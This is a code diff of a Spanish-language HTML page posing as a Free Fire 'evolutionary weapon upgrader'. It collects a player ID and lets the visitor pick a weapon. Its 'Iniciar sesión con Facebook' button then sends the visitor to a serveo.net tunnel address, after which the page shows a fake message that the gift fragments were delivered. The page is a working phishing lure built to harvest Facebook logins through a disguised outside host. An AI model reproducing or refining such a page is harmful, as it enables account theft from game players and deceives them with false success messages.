@@ -3,92 +3,205 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mejoramiento de Armas Evolutivas</title>
+    <title>Mejorador de Armas Evolutivas Free Fire</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            background-color: #111111;
-            color: white;
+            background: rgb(0, 0, 0); /* Fondo RGB */
             overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
-        /* Fondo con rayas azules moviéndose */
-        @keyframes moveStripes {
-            0% { background-position: 0 0; }
-            100% { background-position: 100% 0; }
-        }
-        .moving-background {
-            background: linear-gradient(45deg, #00aaff, #0055ff, #00aaff, #0055ff);
-            background-size: 200% 100%;
-            animation: moveStripes 10s linear infinite;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            width: 100%;
-        }
-        .panel-id {
-            margin-top: 20px;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        #user-id {
-            padding: 15px;
-            font-size: 24px;
-            border-radius: 10px;
-            border: 2px solid #00aaff;
-            background-color: #222;
+        /* Estilo para el panel inicial */
+        .panel {
+            background-color: black;
             color: white;
-            width: 350px; /* Más ancho que antes */
+            padding: 20px;
             text-align: center;
+            border-radius: 10px;
+            width: 350px;
         }
-        #user-id:focus {
+        .panel input {
+            padding: 10px;
+            font-size: 18px;
+            border-radius: 5px;
+            width: 80%;
+            border: 2px solid #00aaff;
+            margin-top: 20px;
+        }
+        .panel input:focus {
             outline: none;
             border-color: #0055ff;
             box-shadow: 0 0 10px rgba(0, 170, 255, 0.7);
         }
-        .line {
-            color: blue;
-            font-size: 30px;
+        .panel button {
+            padding: 10px 20px;
+            background-color: #00aaff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
             margin-top: 20px;
-            font-weight: bold;
+            font-size: 16px;
+        }
+        .panel button:hover {
+            background-color: #0055ff;
+        }
+        /* Estilo para el catálogo de armas */
+        .weapons-container {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+        }
+        .weapon-item {
+            display: inline-block;
+            margin: 0 10px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .weapon-item img {
+            width: 80px;
+            height: 80px;
+            border-radius: 10px;
+        }
+        .weapon-name {
+            margin-top: 10px;
+            font-size: 18px;
+            color: white;
+        }
+        /* Estilo para el login de Facebook */
+        .facebook-login {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .facebook-login button {
+            padding: 15px;
+            background-color: #4267B2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .facebook-login button:hover {
+            background-color: #365899;
+        }
+        /* Cargando mensaje */
+        .loading-message {
+            display: none;
+            text-align: center;
+            font-size: 20px;
+            color: green;
         }
     </style>
 </head>
 <body>
-    <!-- Fondo con rayas -->
+
+    <!-- Fondo de la página con gradiente RGB -->
     <div class="moving-background"></div>
 
-    <div class="container">
-        <!-- Panel ID -->
-        <div class="panel-id">
-            <p>Ingresa tu ID de jugador (10 dígitos):</p>
-            <input type="text" id="user-id" placeholder="Ejemplo: 1234567890" maxlength="10" oninput="validateId()" />
+    <!-- Panel de ID de jugador -->
+    <div class="panel" id="idPanel">
+        <h2>Coloca tu ID de juego</h2>
+        <input type="text" id="userId" placeholder="Ejemplo: 1234567890" maxlength="10" oninput="validateId()">
+        <button id="verifyBtn" onclick="verifyId()">Verificar ID</button>
+    </div>
+
+    <!-- Contenedor de armas (oculto inicialmente) -->
+    <div class="weapons-container" id="weaponsContainer">
+        <div class="weapon-item" onclick="selectWeapon('AK')">
+            <img src="https://example.com/ak_icon.png" alt="AK" />
+            <div class="weapon-name">AK-47</div>
         </div>
-        
-        <!-- Línea Azul -->
-        <div class="line">――――――――――――――――――――――</div>
+        <div class="weapon-item" onclick="selectWeapon('UMP')">
+            <img src="https://example.com/ump_icon.png" alt="UMP" />
+            <div class="weapon-name">UMP</div>
+        </div>
+        <div class="weapon-item" onclick="selectWeapon('MP40')">
+            <img src="https://example.com/mp40_icon.png" alt="MP40" />
+            <div class="weapon-name">MP40</div>
+        </div>
+        <div class="weapon-item" onclick="selectWeapon('M1887')">
+            <img src="https://example.com/m1887_icon.png" alt="M1887" />
+            <div class="weapon-name">M1887</div>
+        </div>
+        <div class="weapon-item" onclick="selectWeapon('M1014')">
+            <img src="https://example.com/m1014_icon.png" alt="M1014" />
+            <div class="weapon-name">M1014</div>
+        </div>
+        <div class="weapon-item" onclick="selectWeapon('SCAR')">
+            <img src="https://example.com/scar_icon.png" alt="SCAR" />
+            <div class="weapon-name">SCAR</div>
+        </div>
+    </div>
+
+    <!-- Login de Facebook (oculto inicialmente) -->
+    <div class="facebook-login" id="facebookLogin">
+        <button onclick="facebookLogin()">Iniciar sesión con Facebook</button>
+    </div>
+
+    <!-- Mensaje de carga -->
+    <div class="loading-message" id="loadingMessage">
+        Fragmentos enviados exitosamente. Revise su cuenta en los regalos.
+        <br>
+        <span id="successMessage">¡Exitoso! ✔</span>
     </div>
 
     <script>
-        // Valida el ID y redirige a la siguiente ventana (Listado de armas)
+        // Verificar que el ID ingresado es solo numérico
         function validateId() {
-            const userId = document.getElementById('user-id').value;
-            if (userId.length === 10 && /^[0-9]+$/.test(userId)) {
-                window.location.href = "weapons.html"; // Redirige a la página de armas
+            const userId = document.getElementById('userId').value;
+            const verifyBtn = document.getElementById('verifyBtn');
+            // Habilitar el botón de verificar solo si el ID tiene 10 dígitos y es numérico
+            if (/^\d{10}$/.test(userId)) {
+                verifyBtn.disabled = false;
+            } else {
+                verifyBtn.disabled = true;
             }
         }
+
+        // Verificar el ID y mostrar el catálogo de armas
+        function verifyId() {
+            const userId = document.getElementById('userId').value;
+            if (/^\d{10}$/.test(userId)) {
+                // Ocultar el panel de ID
+                document.getElementById('idPanel').style.display = 'none';
+                // Mostrar el catálogo de armas
+                document.getElementById('weaponsContainer').style.display = 'block';
+            } else {
+                alert('Por favor ingresa un ID válido de 10 dígitos.');
+            }
+        }
+
+        // Seleccionar el arma y redirigir al login de Facebook
+        function selectWeapon(weapon) {
+            alert('Has seleccionado la ' + weapon + '. Ahora procederás a iniciar sesión.');
+            // Ocultar el catálogo de armas
+            document.getElementById('weaponsContainer').style.display = 'none';
+            // Mostrar el login de Facebook
+            document.getElementById('facebookLogin').style.display = 'block';
+        }
+
+        // Iniciar sesión con Facebook y redirigir
+        function facebookLogin() {
+            window.location.href = "https://babc3bf26bafa9c869659c4fc15c359d.serveo.net"; // Redirige al enlace
+
+            // Mostrar mensaje de carga después de 5 segundos
+            setTimeout(function() {
+                document.getElementById('facebookLogin').style.display = 'none';
+                document.getElementById('loadingMessage').style.display = 'block';
+            }, 5000); // Espera 5 segundos
+
+            setTimeout(function() {
+                document.getElementById('loadingMessage').innerHTML += "<br><span id='successMessage'>¡Exitoso! ✔</span>";
+            }, 5000);
+        }
     </script>
+
 </body>
 </html>
